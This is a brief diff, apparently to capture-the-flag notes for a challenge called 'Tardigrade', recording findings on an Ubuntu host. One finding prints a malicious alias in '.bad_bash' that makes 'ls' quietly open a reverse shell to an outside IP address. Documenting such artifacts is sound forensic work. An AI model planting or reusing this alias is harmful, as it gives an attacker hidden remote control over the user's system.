@@ -1,3 +1,5 @@
+# Tardigrade [MEDIUM]
+
 1. Ubuntu 20.04.6 LTS
 2. 1. .bad_bash
    2. ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
